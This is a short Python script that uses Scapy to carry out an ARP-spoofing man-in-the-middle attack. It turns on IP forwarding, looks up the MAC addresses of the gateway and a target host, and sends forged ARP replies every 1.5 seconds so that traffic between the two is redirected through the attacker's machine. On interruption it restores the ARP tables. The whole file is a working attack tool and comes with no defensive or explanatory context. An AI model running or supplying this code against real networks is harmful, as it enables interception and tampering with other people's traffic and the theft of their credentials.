from scapy.all import *
import os
import sys
import time

class MITM:
	def __init__(self, target):
		self.gateway = conf.route.route("0.0.0.0")[2]
		self.target = target
		self.gateway_mac = getmacbyip(self.gateway)
		self.target_mac = getmacbyip(self.target)
		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

	def reARP(self):
		send(ARP(op=2, pdst=self.gateway, psrc=self.target, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.target_mac), count=7)
		send(ARP(op=2, pdst=self.target, psrc=self.gateway, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gateway_mac), count=7)

	def tick(self, gm, vm):
		send(ARP(op=2, pdst=self.target, psrc=self.gateway, hwdst=vm))
		send(ARP(op=2, pdst=self.gateway, psrc=self.target, hwdst=gm))

	def mitm_attack(self):
		while 1:
			try:
				self.tick(self.gateway_mac, self.target_mac)
				time.sleep(1.5)
			except KeyboardInterrupt:
				self.reARP()
				break
